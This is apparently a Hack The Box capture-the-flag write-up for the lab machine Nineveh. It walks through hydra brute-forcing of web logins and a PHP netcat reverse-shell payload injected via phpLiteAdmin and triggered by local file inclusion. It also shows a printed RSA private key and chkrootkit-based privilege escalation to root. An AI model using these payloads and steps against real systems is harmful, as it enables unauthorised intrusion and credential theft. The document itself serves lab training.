---

title: 🟠 HTB - Nineveh
author: Acivik
date: 2025-01-24 16:00:00 +0300 
categories: [CTF, Hack The Box]
tags: [hackthebox, ctf, hacking, writeup, Nineveh, walkthrough, medium, linux]

---

![https://i.ibb.co/bPLJxfZ/Nineveh.png](https://i.ibb.co/bPLJxfZ/Nineveh.png)

---

# <span style="color:#AA0E1C"><b># Reconnaissance</b></span>

## <span style="color:#0096FF">Nmap</span>

nmap detected 2 open TCP ports: 80 (HTTP), 443(HTTPS)

```bash
root@kali:~/HTB/nineveh# nmap -p- 10.10.10.43 --min-rate 10000 -sVC --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-14 19:50 UTC
Nmap scan report for 10.10.10.43 (10.10.10.43)
Host is up (0.071s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn\'t have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_http-title: Site doesn't have a title (text/html).
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.20 seconds
root@kali:~/HTB/nineveh#
```

There is domain in the TLS certificate `commonName=nineveh.htb`

# <span style="color:#AA0E1C"><b># Enumeration</b></span>

## <span style="color:#0096FF">HTTP - 80/tcp</span>

![https://i.ibb.co/qWb2LBQ/Ekran-g-r-nt-s-2025-01-15-173806.png](https://i.ibb.co/qWb2LBQ/Ekran-g-r-nt-s-2025-01-15-173806.png)

### <span style="color:#FFC300">Dir & Files</span>

```bash
/info.php
/department/login.php
```

`/info.php` → phpinfo page

`/department/login.php`

![https://i.ibb.co/hY4B86F/Ekran-g-r-nt-s-2025-01-15-010240.png](https://i.ibb.co/hY4B86F/Ekran-g-r-nt-s-2025-01-15-010240.png)

`demo:demo`

![https://i.ibb.co/0nxTQY2/Ekran-g-r-nt-s-2025-01-15-010205.png](https://i.ibb.co/0nxTQY2/Ekran-g-r-nt-s-2025-01-15-010205.png)

`admin:admin`

we can identify a username of admin. I’ll run `hydra`

```bash
root@kali:~/HTB/nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!" -V -I
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
```

`admin:1q2w3e4r5t`

![https://i.ibb.co/tJVp33x/resim-2025-01-15-174720872.png](https://i.ibb.co/tJVp33x/resim-2025-01-15-174720872.png)

## <span style="color:#0096FF">HTTPS - 443/tcp</span>

### <span style="color:#FFC300">Dir & Files</span>

```bash
/db/index.php
/db/
```

![https://i.ibb.co/H4gTB7d/Ekran-g-r-nt-s-2025-01-15-174309.png](https://i.ibb.co/H4gTB7d/Ekran-g-r-nt-s-2025-01-15-174309.png)

I’ll run `hydra` again.

```bash
root@kali:~/HTB/nineveh# hydra -l admin -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -R -I
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
```

`password123`

![https://i.ibb.co/q5CXzb6/Ekran-g-r-nt-s-2025-01-15-010806.png](https://i.ibb.co/q5CXzb6/Ekran-g-r-nt-s-2025-01-15-010806.png)

# <span style="color:#AA0E1C"><b># Foothold: Shell as www-data</b></span>

Found LFI at http page

![https://i.ibb.co/Yhs1b7Q/Ekran-g-r-nt-s-2025-01-15-010511.png](https://i.ibb.co/Yhs1b7Q/Ekran-g-r-nt-s-2025-01-15-010511.png)

There is a vuln for `phpliteadmin 1.9.3`  at https page

[PHPLiteAdmin 1.9.3 - Remote PHP Code Injection](https://www.exploit-db.com/exploits/24044)

my payload is there

```bash
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.23 1213 >/tmp/f') ?>
```

Create a database and a table. Place payload as the table name, as shown in the screenshot.

![https://i.ibb.co/VCWZKT9/Ekran-g-r-nt-s-2025-01-15-180018.png](https://i.ibb.co/VCWZKT9/Ekran-g-r-nt-s-2025-01-15-180018.png)

I’m calling this payload using LFI.

http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../var/tmp/injection.php

```bash
root@kali:~/HTB/nineveh# nc -lnvp 1213
listening on [any] 1213 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.43] 38596
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@nineveh:/var/www/html/department$
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: www-data → amrois</b></span>

I ran linpeas,sh

```bash
══╣ Possible private SSH keys were found!
/var/www/ssl/secure_notes/nineveh.png
```

it found the ssh key hidden in the image

```bash
www-data@nineveh:/tmp$ strings /var/www/ssl/secure_notes/nineveh.png

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

# <span style="color:#AA0E1C"><b># Privilege Escalation: amrois → root</b></span>

I’ll monitor the processes with `pspy`

```bash
2025/01/15 03:28:01 CMD: UID=0     PID=23024  | /bin/sh /usr/bin/chkrootkit
```

Chkrootkit is a tool used to detect signs of rootkits on a system.

```bash
root@kali:~/HTB/nineveh# searchsploit chkrootkit
---------------------------------------------------- ----------------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/)
---------------------------------------------------- ----------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit | exploits/linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation        | exploits/linux/local/33899.txt
---------------------------------------------------- ----------------------------------------
Shellcodes: No Result
root@kali:~/HTB/nineveh#
```

We will try to exploit this tool.

Exploit source code:

```bash
def exploit
    print_warning('Rooting depends on the crontab (this could take a while)')

    write_file('/tmp/update', "#!/bin/sh\n(#{payload.encoded}) &\n")
    cmd_exec('chmod +x /tmp/update')
    register_file_for_cleanup('/tmp/update')

    print_status('Payload written to /tmp/update')
    print_status('Waiting for chkrootkit to run via cron...')
  end
```

Let's do it manually

```bash
amrois@nineveh:/tmp$ echo -e "#!/bin/bash" > /tmp/update
-bash: !/bin/bash: event not found
amrois@nineveh:/tmp$ echo '#!/bin/bash' > /tmp/update
amrois@nineveh:/tmp$ echo 'chmod +s /bin/bash' >> /tmp/update
amrois@nineveh:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
amrois@nineveh:/tmp$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 Jun 24  2016 /bin/bash
amrois@nineveh:/tmp$ /bin/bash -p
bash-4.3# cat /root/root.txt
7bdb243112e29e7f1b70c809e3084423
bash-4.3#
```

We got root!